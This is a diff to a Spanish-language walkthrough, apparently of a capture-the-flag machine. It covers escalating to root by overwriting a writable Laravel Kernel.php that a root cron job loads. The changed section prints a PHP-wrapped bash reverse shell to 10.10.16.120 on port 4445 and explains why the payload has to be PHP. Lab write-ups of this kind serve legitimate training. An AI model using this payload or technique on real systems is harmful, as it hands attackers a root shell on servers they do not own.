@@ -228,12 +228,17 @@ ls -l /var/www/laravel/app/Console/Kernel.php
 ```
 
 El fichero es de **`www-data`** (nosotros), así que tenemos permiso de escritura sobre él, y la
-tarea cron lo ejecuta como **root** cada minuto. Lo sustituimos por una *reverse shell*:
+tarea cron lo ejecuta como **root** cada minuto. Lo sustituimos por una *reverse shell*.
+
+Un detalle que importa: lo que se carga es un fichero **PHP**, no un script de shell. La
+tarea llama a `php .../artisan schedule:run`, y `artisan` acaba incluyendo `Kernel.php`, así
+que el código que se ejecute tiene que ser PHP válido. Por eso la *reverse shell* va
+envuelta en `<?php system(...); ?>`: el `system()` es quien lanza la shell.
 
 ![Kernel.php sobrescrito con una reverse shell hacia nuestro equipo](capturas/cronos-kernel-payload.png)
 
-```
-bash -c bash -i >& /dev/tcp/10.10.16.120/4445 0>&1
+```php
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.120/4445 0>&1'"); ?>
 ```
 
 Ponemos un *listener* en el 4445 y esperamos a que salte el cron (máximo un minuto):
